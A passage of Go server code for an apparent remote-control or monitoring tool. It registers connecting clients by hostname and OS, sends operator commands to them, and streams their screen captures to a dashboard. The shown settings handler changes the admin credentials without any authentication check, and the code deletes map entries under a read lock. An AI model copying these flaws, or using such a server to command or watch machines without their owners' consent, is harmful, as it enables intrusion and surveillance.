		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string `json:"clientId"`
		Command  string `json:"command"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	server.clientsMux.RLock()
	client, exists := server.clients[req.ClientID]
	server.clientsMux.RUnlock()

	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	msg := Message{
		Type: req.Command,
		Data: nil,
		Time: time.Now(),
	}

	client.Conn.WriteJSON(msg)

	// Log the command
	logsMux.Lock()
	activityLogs = append(activityLogs, ActivityLog{
		ClientID:  req.ClientID,
		Type:      "command_sent",
		Data:      req.Command,
		Timestamp: time.Now(),
	})
	logsMux.Unlock()

	w.WriteHeader(http.StatusOK)
}

func settingsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var settings struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}

		if err := json.NewDecoder(r.Body).Decode(&settings); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		server.username = settings.Username
		server.password = settings.Password

		w.WriteHeader(http.StatusOK)
	}
}

func clientWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := server.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	// Client registration
	var regMsg Message
	if err := conn.ReadJSON(&regMsg); err != nil {
		log.Printf("Client registration error: %v", err)
		return
	}

	clientData := regMsg.Data.(map[string]interface{})

	// Use provided client ID or generate one
	var clientID string
	if id, exists := clientData["clientId"]; exists {
		clientID = id.(string)
	} else {
		clientID = fmt.Sprintf("client_%d", time.Now().Unix())
	}

	server.clientsMux.Lock()
	// Check if client already exists - update it instead of creating new
	existingClient, exists := server.clients[clientID]
	if exists {
		// Update existing client
		existingClient.IP = r.RemoteAddr
		existingClient.LastSeen = time.Now()
		existingClient.Conn = conn
		log.Printf("Client reconnected: %s (%s)", existingClient.Hostname, existingClient.IP)
	} else {
		// Create new client
		client := &Client{
			ID:       clientID,
			IP:       r.RemoteAddr,
			Hostname: clientData["hostname"].(string),
			OS:       clientData["os"].(string),
			LastSeen: time.Now(),
			Conn:     conn,
		}
		server.clients[clientID] = client
		log.Printf("New client connected: %s (%s)", client.Hostname, client.IP)
	}
	server.clientsMux.Unlock()

	// Get the current client for message handling
	server.clientsMux.RLock()
	currentClient := server.clients[clientID]
	server.clientsMux.RUnlock()

	// Handle client messages
	for {
		var msg Message
		if err := conn.ReadJSON(&msg); err != nil {
			log.Printf("Client message error: %v", err)
			break
		}

		// Update last seen time
		server.clientsMux.Lock()
		if client, exists := server.clients[clientID]; exists {
			client.LastSeen = time.Now()
		}
		server.clientsMux.Unlock()

		// Handle screen capture separately
		if msg.Type == "screen_capture" {
			// Broadcast screen capture to dashboard clients
			broadcastToDashboard(msg)
			continue
		}

		// Log activity
		logsMux.Lock()
		activityLogs = append(activityLogs, ActivityLog{
			ClientID:  clientID,
			Type:      msg.Type,
			Data:      fmt.Sprintf("%v", msg.Data),
			Timestamp: time.Now(),
		})
		logsMux.Unlock()
	}

	// Cleanup
	server.clientsMux.Lock()
	delete(server.clients, clientID)
	server.clientsMux.Unlock()

	log.Printf("Client disconnected: %s", currentClient.Hostname)
}

func broadcastToDashboard(msg Message) {
	dashboardMux.RLock()
	defer dashboardMux.RUnlock()

	for conn := range dashboardClients {
		err := conn.WriteJSON(msg)
		if err != nil {
			// Remove disconnected client
			delete(dashboardClients, conn)
		}
	}
}

func dashboardWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := server.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Dashboard WebSocket upgrade error: %v", err)
		return
	}
	defer func() {
		dashboardMux.Lock()
		delete(dashboardClients, conn)
		dashboardMux.Unlock()
		conn.Close()
	}()

	// Add to dashboard clients
	dashboardMux.Lock()
	dashboardClients[conn] = true
	dashboardMux.Unlock()

	// Keep connection alive and send updates
	for {
		time.Sleep(5 * time.Second)

		msg := Message{
			Type: "ping",
			Time: time.Now(),
		}

		if err := conn.WriteJSON(msg); err != nil {
			break
		}
	}
}
